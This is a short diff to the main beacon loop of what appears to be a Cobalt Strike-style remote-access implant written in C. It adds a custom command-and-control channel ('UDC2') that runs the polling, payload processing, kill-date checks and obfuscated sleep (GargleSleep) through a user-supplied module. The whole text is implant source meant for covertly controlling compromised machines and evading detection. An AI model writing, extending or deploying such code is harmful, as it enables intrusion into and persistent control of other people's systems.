@@ -150,6 +150,24 @@ void beacon(LPVOID lpReserved) {
 		failedHost = FALSE;
 		_snprintf(url, 128, "%s", next_host(hosts, failedHost, &strategyInfo));
 
+		/* 4.12 UDC2: the whole cycle runs through the user C2 BOF */
+		if (udc2_init()) {
+			post_type = POST_UDC2;
+			pivot_poll(command_shell_callback);
+			download_poll(command_shell_callback, MAX_PACKET);
+			link_poll(command_shell_callback);
+			psh_poll(command_shell_callback, MAX_PACKET);
+			if (check_kill_date())
+				command_die(command_shell_callback);
+			length = udc2_cycle(buffer, MAX_GET);
+			if (length > 0)
+				process_payload(buffer, length);
+			if (check_kill_date())
+				safe_exit();
+			if (sleep_time > 0)
+				GargleSleep(sleep_time);
+			continue;
+		}
 		/* 使用HTTP通信输出 */
 		post_type = POST_HTTP;
 
